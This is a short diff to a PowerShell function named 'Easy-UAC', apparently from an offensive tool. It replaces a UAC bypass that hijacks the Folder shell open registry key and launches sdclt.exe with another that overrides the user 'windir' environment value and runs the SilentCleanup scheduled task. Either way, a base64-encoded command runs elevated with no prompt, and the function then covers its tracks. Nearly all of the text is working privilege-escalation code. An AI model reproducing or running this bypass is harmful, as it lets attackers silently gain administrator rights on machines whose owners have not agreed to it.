@@ -22,14 +22,11 @@ function Easy-UAC {
 	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
 	$Path = $env:TEMP + '\A.bat'
-	$Value = "powershell $hide -c Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command';Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
+	$Value = "powershell $hide -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
 	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
 	New-Item -Path $Path -Value '%A%'
-	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
-	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-	sdclt.exe
-	Start-Sleep $SleepDuration
-	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command'
+	New-ItemProperty 'HKCU:\Environment' -Name 'windir' -Value 'cmd.exe /k cmd.exe' -PropertyType String -Force
+	powershell.exe -Command "schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
 	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User)
 	Remove-Item $Path
 	if (!$NoExitHost) {Exit;Exit;Exit}
